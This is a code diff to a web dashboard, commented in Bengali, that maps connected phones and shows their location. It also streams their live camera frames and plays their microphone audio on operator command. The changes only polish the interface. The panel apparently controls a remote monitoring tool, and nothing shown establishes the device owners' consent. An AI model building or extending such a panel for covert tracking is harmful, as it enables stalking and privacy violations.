@@ -9,17 +9,19 @@
         body { background: #0f172a; color: #e2e8f0; padding: 20px; }
         h1 { text-align: center; margin-bottom: 20px; color: #38bdf8; }
         .dashboard { display: flex; flex-wrap: wrap; gap: 20px; }
-        .map-container { flex: 2; min-width: 300px; height: 500px; background: #1e293b; border-radius: 15px; overflow: hidden; }
+        .map-container { flex: 2; min-width: 300px; height: 500px; background: #1e293b; border-radius: 15px; overflow: hidden; position: relative; }
         #map { height: 100%; width: 100%; }
         .info-panel { flex: 1; min-width: 300px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
         .info-panel h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #334155; padding-bottom: 10px; }
         
         .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; cursor: pointer; transition: 0.2s; }
         .device-card:hover { background: #1e293b; transform: scale(1.01); }
+        .device-card.active { border-left-color: #facc15; background: #1e293b; }
         .device-card .name { font-weight: bold; font-size: 16px; color: #38bdf8; }
         .device-card .detail { font-size: 13px; color: #94a3b8; margin-top: 6px; line-height: 1.4; }
         .device-card .detail b { color: #e2e8f0; }
         .online { border-left-color: #22c55e; }
+        .no-data { text-align: center; color: #64748b; margin-top: 50px; }
         
         .action-btns { display: flex; gap: 10px; margin-top: 10px; }
         .btn { flex: 1; color: white; border: none; padding: 8px; border-radius: 5px; font-size: 12px; cursor: pointer; font-weight: bold; transition: 0.2s; }
@@ -28,7 +30,6 @@
         .btn-stop { background: #ef4444; }
         .btn-audio { background: #8b5cf6; }
 
-        /* লাইভ ভিডিও মডাল (CCTV স্টাইল) */
         .video-modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); flex-direction: column; justify-content: center; align-items: center; }
         .video-container { width: 90%; max-width: 800px; background: black; border-radius: 10px; overflow: hidden; position: relative; border: 2px solid #38bdf8; box-shadow: 0 0 20px rgba(56, 189, 248, 0.3); }
         .video-container img { width: 100%; display: block; }
@@ -48,8 +49,10 @@
             <div id="map"></div>
         </div>
         <div class="info-panel">
-            <h2>📱 কানেক্টেড ডিভাইস</h2>
-            <div id="deviceList"></div>
+            <h2>📱 কানেক্টেড ডিভাইস <span style="font-size:12px; color:#64748b;">(লোকেশন দেখতে ক্লিক করুন)</span></h2>
+            <div id="deviceList">
+                <div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>
+            </div>
         </div>
     </div>
 
@@ -82,9 +85,9 @@
         }).addTo(map);
         
         let markers = {};
-        let circles = {};
         let lastAudTime = {};
-        let activeLiveVideoId = null; // কোন ডিভাইসের ভিডিও দেখা হচ্ছে
+        let activeLiveVideoId = null; 
+        let selectedDeviceId = null; // ট্র্যাক করার জন্য কোন ডিভাইস সিলেক্ট করা আছে
 
         function fetchClients() {
             fetch('/api/clients')
@@ -104,8 +107,13 @@
                         const card = document.createElement('div');
                         card.className = 'device-card online';
                         
+                        // কার্ডে ক্লিক করলে শুধু লোকেশন জুম করবে
                         card.onclick = () => {
-                            if (data.lat && data.lng) map.setView([parseFloat(data.lat), parseFloat(data.lng)], 16);
+                            selectedDeviceId = id; // এই ডিভাইসটি সিলেক্টেড
+                            if (data.lat && data.lng && data.lat !== 0) {
+                                // অ্যানিমেশনসহ ম্যাপ সেন্টার করা
+                                map.flyTo([parseFloat(data.lat), parseFloat(data.lng)], 16, { duration: 1.5 });
+                            }
                         };
                         
                         card.innerHTML = `
@@ -122,14 +130,14 @@
                         `;
                         list.appendChild(card);
 
-                        // নতুন ভিডিও ফ্রেম আসলে লাইভ স্ক্রিনে দেখানো
+                        // ভিডিও ফ্রেম আপডেট (যদি এই ডিভাইসের লাইভ ভিডিও দেখা হচ্ছে)
                         if (data.video_frame && data.video_time) {
                             if (activeLiveVideoId === id) {
                                 document.getElementById('liveVideoFeed').src = data.video_frame;
                             }
                         }
 
-                        // নতুন অডিও আসলে প্লে করা
+                        // অডিও প্লে করা
                         if (data.audio_data && data.audio_time && lastAudTime[id] !== data.audio_time) {
                             lastAudTime[id] = data.audio_time;
                             document.getElementById('modalAudio').src = data.audio_data;
@@ -137,12 +145,18 @@
                             document.getElementById('modalAudio').play();
                         }
 
-                        if (data.lat && data.lng) {
+                        // ম্যাপে মার্কার আপডেট (ব্লিংকিং ফিক্স)
+                        if (data.lat && data.lng && data.lat !== 0) {
                             const pos = [parseFloat(data.lat), parseFloat(data.lng)];
                             if (markers[id]) {
-                                markers[id].setLatLng(pos);
+                                markers[id].setLatLng(pos); // শুধু পজিশন আপডেট হবে, জুম হবে না
                             } else {
                                 markers[id] = L.marker(pos).addTo(map);
+                                // প্রথমবার লোড হলে একবার জুম করবে
+                                if (!selectedDeviceId) {
+                                    map.flyTo(pos, 16, { duration: 1.5 });
+                                    selectedDeviceId = id;
+                                }
                             }
                         }
                     });
@@ -154,7 +168,7 @@
             if (command === 'start_live') {
                 activeLiveVideoId = clientId;
                 document.getElementById('videoModal').style.display = 'flex';
-                document.getElementById('liveVideoFeed').src = ""; // রিসেট
+                document.getElementById('liveVideoFeed').src = ""; 
             } else if (command === 'stop_live') {
                 if (activeLiveVideoId === clientId) {
                     activeLiveVideoId = null;
@@ -182,7 +196,7 @@
         }
 
         fetchClients();
-        setInterval(fetchClients, 500); // প্রতি ৫০০ মিলি সেকেন্ডে আপডেট (ভিডিও স্মুথ রাখার জন্য)
+        setInterval(fetchClients, 1000); // প্রতি ১ সেকেন্ডে আপডেট (ভিডিও স্মুথ রাখার জন্য)
     </script>
 </body>
 </html>
